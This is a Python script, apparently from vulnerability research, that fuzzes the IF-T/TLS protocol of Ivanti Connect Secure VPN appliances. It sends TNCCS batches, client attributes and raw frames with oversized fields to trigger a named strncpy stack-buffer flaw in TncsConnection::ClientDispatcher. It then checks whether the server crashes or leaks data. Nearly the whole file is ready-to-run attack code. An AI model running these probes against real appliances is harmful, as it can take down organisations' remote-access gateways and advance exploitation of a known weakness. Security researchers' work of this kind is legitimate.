#!/usr/bin/env python3
"""
IF-T/TLS Protocol Fuzzer for Ivanti Connect Secure
Target: TncsConnection::ClientDispatcher strncpy(stack_buf, src, 0x4f)

IF-T/TLS Protocol:
  - Runs over TLS on port 443
  - Uses binary framing: Type(4) + VendorID(4) + Length(4) + Seq(4) + Data
  - VendorID 0x0a4c = Juniper/Ivanti (2636 decimal)
  - VendorID 0x0583 = TCG TNC

TNC Messages (reach TncsConnection::ClientDispatcher):
  - Carried inside IF-T/TLS frames with VendorID=0x0583
  - TNC protocol has its own header: Type(4) + Length(4) + Data
  - ClientDispatcher processes TNC client messages
  - strncpy to stack buffer with n=0x4f (79 bytes) — no null termination if src >= 79

Goal: Send TNC messages with fields >= 79 bytes to trigger strncpy
      without null termination → potential info leak or crash
"""

import ssl
import socket
import struct
import sys
import time


# IF-T/TLS Constants
IFT_VENDOR_IVANTI = 0x00000a4c  # Juniper/Ivanti
IFT_VENDOR_TCG    = 0x00000583  # TCG TNC
IFT_VENDOR_IETF   = 0x00000000  # IETF

# IF-T Message Types
IFT_TYPE_HANDSHAKE     = 0x00000001
IFT_TYPE_DATA          = 0x00000002
IFT_TYPE_PREAUTH_INIT  = 0x00000003
IFT_TYPE_PREAUTH_RESP  = 0x00000004

# TNC Message Types (inside IF-T frames)
TNC_TYPE_BATCH         = 0x00000002
TNC_TYPE_SINGLE        = 0x00000001


def build_ift_message(msg_type, vendor_id, data, seq=1):
    """Build an IF-T/TLS message frame"""
    length = 16 + len(data)  # header(16) + data
    header = struct.pack('>IIII', msg_type, vendor_id, length, seq)
    return header + data


def build_tnc_message(tnc_type, data):
    """Build a TNC message (inside IF-T frame)"""
    length = 8 + len(data)
    header = struct.pack('>II', tnc_type, length)
    return header + data


def build_tnccs_batch(messages):
    """Build a TNCCS batch message (XML-based TNC protocol)"""
    xml = '<?xml version="1.0"?>\n'
    xml += '<TNCCS-Batch BatchId="1" Recipient="TNCS" '
    xml += 'xmlns="http://www.trustedcomputinggroup.org/IWG/TNC/1_0/IF_TNCCS#" '
    xml += 'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
    xml += 'xsi:schemaLocation="http://www.trustedcomputinggroup.org/IWG/TNC/1_0/IF_TNCCS# '
    xml += 'https://www.trustedcomputinggroup.org/XML/SCHEMA/TNCCS_1.0.xsd">\n'
    for msg in messages:
        xml += msg + '\n'
    xml += '</TNCCS-Batch>'
    return xml.encode()


def send_ift(sock, data):
    """Send data and receive response"""
    sock.send(data)
    time.sleep(0.5)
    try:
        resp = sock.recv(4096)
        return resp
    except socket.timeout:
        return None


def connect_tls(host, port, timeout=10):
    """Establish TLS connection"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(socket.socket(), server_hostname=host)
    sock.settimeout(timeout)
    sock.connect((host, port))
    return sock


def test_ift_handshake(host, port):
    """Test 1: IF-T/TLS handshake"""
    print("\n[1] IF-T/TLS Handshake...")
    try:
        sock = connect_tls(host, port)

        # Send IF-T version negotiation (IETF type 1)
        version_data = struct.pack('>II', 1, 1)  # version 1, max version 1
        msg = build_ift_message(IFT_TYPE_HANDSHAKE, IFT_VENDOR_IETF, version_data, seq=0)
        resp = send_ift(sock, msg)

        if resp:
            print(f"  Response: {len(resp)} bytes")
            print(f"  Hex: {resp[:32].hex()}")
            if len(resp) >= 16:
                rtype, rvendor, rlen, rseq = struct.unpack('>IIII', resp[:16])
                print(f"  Type=0x{rtype:08x} Vendor=0x{rvendor:08x} Len={rlen} Seq={rseq}")
                return sock, True
        else:
            print("  No response (timeout)")

        sock.close()
    except Exception as e:
        print(f"  Error: {e}")

    return None, False


def test_preauth_init(sock):
    """Test 2: IF-T PREAUTH_INIT message"""
    print("\n[2] IF-T PREAUTH_INIT...")
    try:
        # Preauth init with Ivanti vendor
        init_data = struct.pack('>I', 1)  # version
        init_data += b'\x00' * 20  # padding/attributes

        msg = build_ift_message(IFT_TYPE_PREAUTH_INIT, IFT_VENDOR_IVANTI, init_data, seq=1)
        resp = send_ift(sock, msg)

        if resp:
            print(f"  Response: {len(resp)} bytes")
            print(f"  Hex: {resp[:48].hex()}")
            return True
        else:
            print("  No response")
            return False
    except Exception as e:
        print(f"  Error: {e}")
        return False


def test_tnc_overflow(host, port):
    """Test 3: TNC message with oversized fields to trigger strncpy overflow"""
    print("\n[3] TNC Message Overflow Tests...")

    # TncsConnection::ClientDispatcher strncpy sizes:
    # strncpy(stack_buf, src, 0x4f)  = 79 bytes
    # strncpy(stack_buf, src, 0x13f) = 319 bytes

    overflow_sizes = [
        (79, "0x4f boundary"),
        (80, "0x4f+1 overflow"),
        (100, "0x4f+21"),
        (319, "0x13f boundary"),
        (320, "0x13f+1 overflow"),
        (500, "large overflow"),
        (1000, "very large"),
    ]

    for size, desc in overflow_sizes:
        try:
            sock = connect_tls(host, port)

            # Build TNCCS batch with oversized IMC-IMV message
            overflow_str = 'A' * size
            tnccs_msgs = [
                f'<IMC-IMV-Message>'
                f'<Type>0x00000001</Type>'
                f'<Base64>{overflow_str}</Base64>'
                f'</IMC-IMV-Message>',
            ]
            batch = build_tnccs_batch(tnccs_msgs)

            # Wrap in TNC message
            tnc_msg = build_tnc_message(TNC_TYPE_BATCH, batch)

            # Wrap in IF-T frame with TCG vendor (reaches TNC handler)
            ift_msg = build_ift_message(IFT_TYPE_DATA, IFT_VENDOR_TCG, tnc_msg, seq=1)

            resp = send_ift(sock, ift_msg)

            if resp:
                print(f"  Size={size:4} ({desc:20}): {len(resp)} bytes response")
                if len(resp) > 100:
                    print(f"    Hex: {resp[:48].hex()}")
            elif resp is None:
                print(f"  Size={size:4} ({desc:20}): TIMEOUT (possible hang)")
            else:
                print(f"  Size={size:4} ({desc:20}): Empty response")

            sock.close()
            time.sleep(0.2)

        except ConnectionResetError:
            print(f"  Size={size:4} ({desc:20}): CONNECTION RESET!")
            time.sleep(1)
            # Check if server is still alive
            try:
                check = connect_tls(host, port)
                check.close()
                print(f"    Server still alive")
            except:
                print(f"    [!!!] SERVER DOWN!")
                return False

        except Exception as e:
            print(f"  Size={size:4} ({desc:20}): Error: {e}")

    return True


def test_tnc_attribute_overflow(host, port):
    """Test 4: TNC client attributes with oversized values"""
    print("\n[4] TNC Client Attribute Overflow...")

    # Client attributes are processed by the web binary before TNC
    # R2.3 has NO isValidClientAttrVal validation
    # These attributes go through strncpy to stack buffers

    attrs = [
        ("clientCapabilities", 'B' * 200),
        ("hostName", 'C' * 200),
        ("macAddress", 'D' * 200),
        ("deviceId", 'E' * 200),
        ("userName", 'F' * 200),
        ("osVersion", 'G' * 200),
    ]

    for attr_name, attr_value in attrs:
        try:
            sock = connect_tls(host, port)

            # Build IF-T preauth init with oversized attribute
            attr_data = f'{attr_name}={attr_value}'.encode()
            attr_tlv = struct.pack('>HH', 1, len(attr_data)) + attr_data

            # Wrap in IF-T PREAUTH_INIT
            init_data = struct.pack('>I', 1) + attr_tlv
            ift_msg = build_ift_message(IFT_TYPE_PREAUTH_INIT, IFT_VENDOR_IVANTI, init_data, seq=1)

            resp = send_ift(sock, ift_msg)

            if resp:
                print(f"  {attr_name:20}: {len(resp)} bytes response")
            elif resp is None:
                print(f"  {attr_name:20}: TIMEOUT")
            else:
                print(f"  {attr_name:20}: Empty")

            sock.close()
            time.sleep(0.2)

        except ConnectionResetError:
            print(f"  {attr_name:20}: CONNECTION RESET!")
            time.sleep(1)
        except Exception as e:
            print(f"  {attr_name:20}: Error: {e}")


def test_raw_binary_ift(host, port):
    """Test 5: Raw binary IF-T messages targeting strncpy"""
    print("\n[5] Raw Binary IF-T Messages...")

    # Send various raw binary payloads as IF-T messages
    # Targeting the web binary's IF-T parser before it reaches TNC

    payloads = [
        # Standard IF-T with Ivanti vendor, type 0x89 (EAP)
        ("EAP msg", build_ift_message(0x00000089, IFT_VENDOR_IVANTI,
                                       b'\x02\x00' + struct.pack('>H', 500) + b'\x01' + b'X' * 495, seq=1)),

        # IF-T with TCG vendor, type 2 (data) + large payload
        ("TNC data large", build_ift_message(IFT_TYPE_DATA, IFT_VENDOR_TCG,
                                              b'Y' * 2000, seq=1)),

        # IF-T preauth init with many attributes
        ("Preauth many attrs", build_ift_message(IFT_TYPE_PREAUTH_INIT, IFT_VENDOR_IVANTI,
                                                  struct.pack('>I', 1) + b'Z' * 1000, seq=1)),

        # IF-T with type 0x92 (another Ivanti type from routing table)
        ("Type 0x92", build_ift_message(0x00000092, IFT_VENDOR_IVANTI,
                                         b'W' * 500, seq=1)),

        # IF-T with type 0x107 (another Ivanti type)
        ("Type 0x107", build_ift_message(0x00000107, IFT_VENDOR_IVANTI,
                                          b'V' * 500, seq=1)),
    ]

    for name, payload in payloads:
        try:
            sock = connect_tls(host, port)
            resp = send_ift(sock, payload)

            if resp:
                print(f"  {name:25}: {len(resp)} bytes")
                # Check for any data leak in response
                if any(c in resp for c in [b'X' * 10, b'Y' * 10, b'Z' * 10]):
                    print(f"    [!!!] INPUT DATA REFLECTED IN RESPONSE!")
            elif resp is None:
                print(f"  {name:25}: TIMEOUT")
            else:
                print(f"  {name:25}: Empty/Closed")

            sock.close()
            time.sleep(0.2)

        except ConnectionResetError:
            print(f"  {name:25}: RESET")
        except BrokenPipeError:
            print(f"  {name:25}: BROKEN PIPE")
        except Exception as e:
            print(f"  {name:25}: {e}")


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print(f"  Example: {sys.argv[0]} 127.0.0.1 20443")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    print("=" * 60)
    print("  IF-T/TLS Protocol Fuzzer")
    print(f"  Target: {host}:{port}")
    print(f"  Goal: Trigger strncpy overflow in TncsConnection")
    print("=" * 60)

    # Test 1: Handshake
    sock, ok = test_ift_handshake(host, port)
    if sock:
        # Test 2: Preauth init on existing connection
        test_preauth_init(sock)
        sock.close()

    # Test 3: TNC message overflow
    test_tnc_overflow(host, port)

    # Test 4: Client attribute overflow
    test_tnc_attribute_overflow(host, port)

    # Test 5: Raw binary messages
    test_raw_binary_ift(host, port)

    # Final check: is server still alive?
    print("\n[*] Final server health check...")
    try:
        sock = connect_tls(host, port)
        sock.send(b'GET / HTTP/1.1\r\nHost: test\r\nConnection: close\r\n\r\n')
        resp = sock.recv(4096)
        sock.close()
        if resp:
            print(f"  Server alive: {resp[:30]}")
        else:
            print("  Server alive but no HTTP response")
    except Exception as e:
        print(f"  [!!!] Server may be DOWN: {e}")

    print("\n[*] Fuzzing complete")


if __name__ == "__main__":
    main()
